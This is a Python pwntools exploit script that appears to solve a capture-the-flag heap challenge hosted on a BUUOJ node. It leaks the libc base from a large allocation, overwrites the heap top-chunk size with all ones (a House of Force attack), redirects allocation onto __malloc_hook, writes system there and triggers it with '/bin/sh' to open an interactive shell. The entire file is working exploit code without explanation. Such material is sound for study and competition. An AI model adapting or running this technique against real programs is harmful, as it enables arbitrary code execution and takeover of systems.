#coding:utf-8
from pwn import *
context.log_level = 'debug'
debug = 0

def wpAdd(r, size, content):
	r.recvuntil('2:puts\n')
	r.send('1\x00')

	r.recvuntil('size\n')
	r.send(str(size).ljust(0xf, '\x00'))
	r.recvuntil('addr ')

	address = int(r.recvuntil('\n')[:-1], 16)

	r.recvuntil('content\n')
	r.send(content)
	return address

def wpPut(r):
	r.recvuntil('2:puts\n')
	r.send('2\x00')
	


def exp(debug):

	elf = ELF('./pwn')
	if debug == 1:
		r = process('./pwn')
		#gdb.attach(r, 'b *$rebase(0x0000000000000AF9)')
		lib = ELF('/lib/x86_64-linux-gnu/libc.so.6')
	else:
		r = remote('node3.buuoj.cn', 29469)
		lib = ELF('/lib/x86_64-linux-gnu/libc.so.6')

	lib_base = wpAdd(r, 0x200000, 'a') + 0x7f5cb07b8000 - 0x7f5cb05b7010
	log.info("lib_address => %#x"%(lib_base))

	malloc_hook = lib.sym['__malloc_hook']
	log.info("malloc_address => %#x"%(malloc_hook + lib_base))

	bin_add = wpAdd(r, 0x8, '/bin/sh\x00' + '\x00' * 0x10 + p64(0xFFFFFFFFFFFFFFFF))

	wpAdd(r, malloc_hook + lib_base - 0x10 - bin_add - 0x18, 'a')

	wpAdd(r, 0x8, p64(lib_base + lib.sym['system']))

	#----get shell
	
	r.recvuntil('2:puts\n')
	r.send('1\x00')

	r.recvuntil('size\n')
	r.send(str(bin_add).ljust(0xf, '\x00'))

	r.interactive()
	
		


exp(debug)

